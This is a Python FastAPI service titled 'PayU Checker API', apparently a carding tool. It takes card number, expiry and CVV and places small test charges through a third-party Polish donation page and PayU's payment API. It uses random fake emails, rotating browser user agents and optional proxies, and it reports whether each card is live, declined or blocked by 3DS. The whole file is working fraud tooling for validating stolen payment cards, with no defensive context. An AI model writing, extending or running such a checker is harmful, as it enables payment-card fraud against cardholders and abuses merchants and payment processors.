from fastapi import FastAPI, Query, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import StreamingResponse, JSONResponse
import re
import json
import time
import random
import string
import requests

app = FastAPI(title="PayU Checker API")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ================== HELPER FUNCTIONS ==================
def _random_email():
    chars = string.ascii_lowercase + string.digits
    user = ''.join(random.choices(chars, k=10))
    return f"{user}@gmail.com"

def _random_ua():
    versions = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
    ]
    return random.choice(versions)

def _poll_status(session, order_id, token, ua, is_3ds, max_attempts=4, delay=3):
    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'authorization': f'Bearer {token}',
        'referer': f'https://secure.payu.com/pay/?orderId={order_id}&token={token}',
        'user-agent': ua,
    }
    for _ in range(max_attempts):
        time.sleep(delay)
        try:
            r = session.get(f'https://secure.payu.com/api/front/orders/{order_id}/status', headers=headers, timeout=30)
            data = r.json()
            if data.get('category') not in ('IN_PROGRESS', 'NEW'):
                return data
        except:
            pass
    return {"category": "TIMEOUT_POLL", "is_3ds": is_3ds}

# ================== EVENT STREAM (LAMA - TAK DIUBAH) ==================
def event_stream(card_num, mm, yy, cvv_code, site_url, proxy_str):
    session = requests.Session()
    try:
        if proxy_str:
            session.proxies = {
                'http': f"http://{proxy_str}" if not proxy_str.startswith('http') else proxy_str,
                'https': f"http://{proxy_str}" if not proxy_str.startswith('http') else proxy_str,
            }
        email = _random_email()
        ua = _random_ua()
        name = "Jan Kowalski"
        if len(yy) == 2:
            yy = '20' + yy

        # STEP 1: PROXY & MERCHANT REQUEST
        if proxy_str:
            proxy_ip = proxy_str.split('@')[-1] if '@' in proxy_str else proxy_str
            yield f"data: {json.dumps({'type': 'log', 'msg': f'Connecting via Proxy -> {proxy_ip}', 'class': 'warn'})}\n\n"
        else:
            yield f"data: {json.dumps({'type': 'log', 'msg': 'Connecting using Railway Default IP...', 'class': 'info'})}\n\n"
           
        yield f"data: {json.dumps({'type': 'log', 'msg': 'Initiating connection to Merchant API...', 'class': 'info'})}\n\n"
       
        if 'horse_payu' in site_url or 'ajax' in site_url:
            ajax_url = site_url if site_url.endswith('/') else site_url + '/'
            headers1 = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': site_url.split('/ajax')[0] if '/ajax' in site_url else site_url.rsplit('/', 1)[0],
                'referer': site_url,
                'user-agent': ua,
                'x-requested-with': 'XMLHttpRequest',
            }
            data1 = {'amount': '20', 'firstname': name.split()[0], 'lastname': name.split()[1], 'email': email, 'extra': ''}
        else:
            ajax_url = site_url
            headers1 = {
                'accept': 'text/html',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': site_url.rsplit('/', 1)[0],
                'referer': site_url,
                'user-agent': ua,
            }
            data1 = {'name': name, 'email': email, 'amount': '20', 'purpose': 'Donation'}

        r1 = session.post(ajax_url, headers=headers1, data=data1, allow_redirects=False, timeout=30)
        order_id, token = None, None
        loc = r1.headers.get('Location', '')
        body = r1.text
        search_pool = loc + " " + body
       
        oid = re.search(r'orderId=([^&]+)', search_pool)
        tok = re.search(r'token=([^&]+)', search_pool)
        if oid: order_id = oid.group(1)
        if tok: token = tok.group(1)

        if not order_id or not token:
            yield f"data: {json.dumps({'type': 'log', 'msg': 'Failed to extract Order ID or Token.', 'class': 'error'})}\n\n"
            yield f"data: {json.dumps({'type': 'result', 'msg': 'Failed to extract Order ID', 'status': 'error', 'raw': {'error': r1.text[:500]}})}\n\n"
            return

        yield f"data: {json.dumps({'type': 'log', 'msg': f'Merchant Order Created -> ID: {order_id}', 'class': 'success'})}\n\n"

        # STEP 2: LOAD PAYU GATEWAY
        yield f"data: {json.dumps({'type': 'log', 'msg': 'Accessing PayU Secure Payment Gateway...', 'class': 'info'})}\n\n"
       
        try:
            page_html = session.get('https://secure.payu.com/pay/', params={'orderId': order_id, 'token': token}, headers={'user-agent': ua}, timeout=30).text
            amt_match = re.search(r'"totalAmount"\s*:\s*"?(\d+)"?', page_html)
            final_amount = int(amt_match.group(1)) if amt_match else 2000
            yield f"data: {json.dumps({'type': 'log', 'msg': f'Gateway loaded. Amount: {final_amount/100} PLN', 'class': 'info'})}\n\n"
        except:
            final_amount = 2000
            yield f"data: {json.dumps({'type': 'log', 'msg': 'Gateway loaded.', 'class': 'info'})}\n\n"

        # STEP 3: TOKENIZE CARD
        yield f"data: {json.dumps({'type': 'log', 'msg': f'Tokenizing Card: {card_num[:6]}******{card_num[-4:]}...', 'class': 'info'})}\n\n"
       
        headers3 = {
            'accept': '*/*', 'authorization': f'Bearer {token}', 'content-type': 'application/json',
            'origin': 'https://secure.payu.com', 'referer': f'https://secure.payu.com/pay/?orderId={order_id}&token={token}',
            'user-agent': ua,
        }
        json3 = {'posId': 'PAYU S.A.', 'type': 'SINGLE', 'card': {'number': card_num, 'cvv': cvv_code, 'expirationMonth': mm, 'expirationYear': yy}}
       
        r3 = session.post('https://secure.payu.com/api/front/tokens', headers=headers3, json=json3, timeout=30)
        try:
            token_data = r3.json()
        except:
            yield f"data: {json.dumps({'type': 'log', 'msg': 'Tokenization Failed: Invalid response from PayU.', 'class': 'error'})}\n\n"
            yield f"data: {json.dumps({'type': 'result', 'msg': 'Card Declined: Invalid response', 'status': 'error', 'raw': {}})}\n\n"
            return

        card_token = token_data.get('value')
        if not card_token:
            err = token_data.get('error', {})
            err_msg = err.get('message', str(err)) if isinstance(err, dict) else str(err)
            if not err_msg: err_msg = "Invalid card details or unsupported card type."
           
            yield f"data: {json.dumps({'type': 'log', 'msg': f'Tokenization Failed: {err_msg}', 'class': 'error'})}\n\n"
            yield f"data: {json.dumps({'type': 'result', 'msg': f'Card Declined: {err_msg}', 'status': 'error', 'raw': token_data})}\n\n"
            return

        yield f"data: {json.dumps({'type': 'log', 'msg': 'Card tokenized successfully.', 'class': 'success'})}\n\n"

        # STEP 4: SUBMIT PAYMENT
        yield f"data: {json.dumps({'type': 'log', 'msg': 'Submitting payment charge to PayU...', 'class': 'info'})}\n\n"
       
        masked = card_num[:6] + '*' * 6 + card_num[-4:]
        json4 = {
            'email': email, 'firstName': name.split()[0], 'lastName': name.split()[1],
            'currency': 'PLN', 'amount': final_amount,
            'payMethod': {'type': 'c', 'token': card_token, 'cardDetails': {'maskedCardNumber': masked}},
            'browserData': {'screenWidth': 800, 'javaEnabled': False, 'timezoneOffset': -330, 'screenHeight': 1280, 'userAgent': ua, 'colorDepth': 24, 'language': 'en-US', 'challengeWindowSize': '04'},
            'language': 'en',
        }
        r4 = session.post(f'https://secure.payu.com/api/front/orders/{order_id}/payments', headers=headers3, json=json4, timeout=30)
        try:
            pay_data = r4.json()
        except:
            yield f"data: {json.dumps({'type': 'log', 'msg': 'Failed to submit payment.', 'class': 'error'})}\n\n"
            yield f"data: {json.dumps({'type': 'result', 'msg': 'Payment submission failed', 'status': 'error', 'raw': {}})}\n\n"
            return

        if pay_data.get('status') == 'ERROR' or pay_data.get('errorCode'):
            err_desc = pay_data.get('error', {}).get('description', '') if isinstance(pay_data.get('error'), dict) else str(pay_data.get('errorCode', ''))
            yield f"data: {json.dumps({'type': 'log', 'msg': f'PayU Rejected: {err_desc}', 'class': 'error'})}\n\n"
            yield f"data: {json.dumps({'type': 'result', 'msg': f'Payment declined: {err_desc}', 'status': 'error', 'raw': pay_data})}\n\n"
            return

        yield f"data: {json.dumps({'type': 'log', 'msg': 'Payment accepted by PayU. Waiting for Bank response...', 'class': 'success'})}\n\n"

        # STEP 5: POLL BANK STATUS
        continue_url = pay_data.get('continueUrl', '')
        is_3ds = 'threeds' in continue_url
        if is_3ds:
            yield f"data: {json.dumps({'type': 'log', 'msg': '3DS Security protocol triggered. Polling bank status...', 'class': 'warn'})}\n\n"
            final_status = _poll_status(session, order_id, token, ua, is_3ds=True, max_attempts=4, delay=3)
        else:
            yield f"data: {json.dumps({'type': 'log', 'msg': 'Checking direct bank status...', 'class': 'info'})}\n\n"
            final_status = _poll_status(session, order_id, token, ua, is_3ds=False, max_attempts=3, delay=3)

        category = final_status.get('category', '')
        value = final_status.get('value', '')

        # FINAL RESULT
        if category == 'TIMEOUT_POLL':
            if is_3ds:
                yield f"data: {json.dumps({'type': 'log', 'msg': f'Bank Response: TIMEOUT (3DS Pending)', 'class': 'error'})}\n\n"
                yield f"data: {json.dumps({'type': 'log', 'msg': 'Conclusion: 3DS Card detected but bank timed out. Marked as DECLINED.', 'class': 'error'})}\n\n"
                yield f"data: {json.dumps({'type': 'result', 'msg': 'Declined: 3DS Timeout', 'status': 'error', 'raw': final_status})}\n\n"
            else:
                yield f"data: {json.dumps({'type': 'log', 'msg': 'Bank Response: TIMEOUT (No response)', 'class': 'error'})}\n\n"
                yield f"data: {json.dumps({'type': 'log', 'msg': 'Conclusion: Bank did not respond. Marked as DECLINED.', 'class': 'error'})}\n\n"
                yield f"data: {json.dumps({'type': 'result', 'msg': 'Declined: Bank Timeout', 'status': 'error', 'raw': final_status})}\n\n"
        elif category == 'SUCCESS':
            yield f"data: {json.dumps({'type': 'log', 'msg': 'Transaction completed: PAYMENT SUCCESSFUL', 'class': 'success'})}\n\n"
            yield f"data: {json.dumps({'type': 'result', 'msg': 'Payment Successful', 'status': 'success', 'raw': final_status})}\n\n"
        elif category in ('WARNING_CONTINUE_3DS', 'IN_PROGRESS'):
            yield f"data: {json.dumps({'type': 'log', 'msg': f'Bank Response: 3DS_REQUIRED / {value}', 'class': 'error'})}\n\n"
            yield f"data: {json.dumps({'type': 'log', 'msg': 'Conclusion: 3DS Card detected. Marked as DECLINED (Cannot bypass OTP).', 'class': 'error'})}\n\n"
            yield f"data: {json.dumps({'type': 'result', 'msg': 'Declined: 3DS Security Block', 'status': 'error', 'raw': final_status})}\n\n"
        elif category == 'ERROR':
            yield f"data: {json.dumps({'type': 'log', 'msg': f'Bank Response: {value}', 'class': 'error'})}\n\n"
            yield f"data: {json.dumps({'type': 'log', 'msg': 'Conclusion: Card declined by bank (Dead/Blocked/No Funds).', 'class': 'error'})}\n\n"
            yield f"data: {json.dumps({'type': 'result', 'msg': f'Payment declined: {value}', 'status': 'error', 'raw': final_status})}\n\n"
        else:
            yield f"data: {json.dumps({'type': 'log', 'msg': f'Uncertain Gateway Response: {category} - {value}', 'class': 'warn'})}\n\n"
            yield f"data: {json.dumps({'type': 'result', 'msg': f'{category}: {value}', 'status': 'error', 'raw': final_status})}\n\n"

    except requests.exceptions.Timeout:
        yield f"data: {json.dumps({'type': 'log', 'msg': 'Connection Timeout. Gateway took too long to respond.', 'class': 'error'})}\n\n"
        yield f"data: {json.dumps({'type': 'result', 'msg': 'Timeout from Payment Gateway', 'status': 'error', 'raw': {}})}\n\n"
    except Exception as e:
        yield f"data: {json.dumps({'type': 'log', 'msg': f'System Critical Error: {str(e)}', 'class': 'error'})}\n\n"
        yield f"data: {json.dumps({'type': 'result', 'msg': f'Error: {str(e)}', 'status': 'error', 'raw': {}})}\n\n"
    finally:
        session.close()

# ================== SIMPLE JSON API ==================
@app.get("/check")
async def check_card_json(
    cc: str = Query(..., description="cc|mm|yy|cvv"),
    site: str = Query("https://beta3.centaurus.org.pl/ajax/horse_payu/"),
    proxy: str = Query(None)
):
    parts = cc.split('|')
    if len(parts) != 4:
        raise HTTPException(status_code=400, detail="Invalid format. Use: cc|mm|yy|cvv")
   
    card_num, mm, yy, cvv_code = parts
    mm = mm.zfill(2)
    if len(yy) == 2:
        yy = '20' + yy
       
    # Jalankan logic dan ambil result akhir sahaja
    # Untuk JSON kita guna generator tapi ambil result terakhir
    result = None
    for data in event_stream(card_num, mm, yy, cvv_code, site, proxy):
        try:
            parsed = json.loads(data.replace("data: ", "").strip())
            if parsed.get('type') == 'result':
                result = parsed
                break
        except:
            continue
    
    if result:
        return JSONResponse(content=result)
    else:
        return JSONResponse(content={"status": "error", "msg": "No result received"})

# ================== STREAMING (LAMA) ==================
@app.get("/check/stream")
async def check_card_stream(
    cc: str = Query(...),
    site: str = Query("https://beta3.centaurus.org.pl/ajax/horse_payu/"),
    proxy: str = Query(None)
):
    parts = cc.split('|')
    if len(parts) != 4:
        raise HTTPException(status_code=400, detail="Invalid format. Use: cc|mm|yy|cvv")
   
    card_num, mm, yy, cvv_code = parts
    mm = mm.zfill(2)
    if len(yy) == 2:
        yy = '20' + yy
       
    return StreamingResponse(
        event_stream(card_num, mm, yy, cvv_code, site, proxy), 
        media_type="text/event-stream"
    )

# Root
@app.get("/")
async def root():
    return {"status": "ok", "message": "PayU Checker API Ready", "endpoints": ["/check", "/check/stream"]}
